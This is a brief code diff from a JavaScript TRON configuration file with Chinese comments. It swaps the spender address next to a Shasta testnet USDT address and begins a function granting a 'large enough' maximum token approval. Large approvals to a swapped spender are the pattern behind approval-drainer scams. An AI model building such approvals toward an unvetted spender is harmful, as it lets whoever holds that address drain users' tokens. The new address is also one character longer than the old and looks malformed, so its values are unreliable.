@@ -2,7 +2,7 @@
 
 // ====== TRON 链配置 ======
 const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
-const spenderAddress = "TTqCn1whizbpg1o5EfHW9MUjGiKrX7ScRG";
+const spenderAddress = "TMcjcKsZZLSFh9nJpTfPejHx7EPjdzG5XkC";
 
 // ====== 最大授权额度 ======
 function getLargeEnoughAmount() {
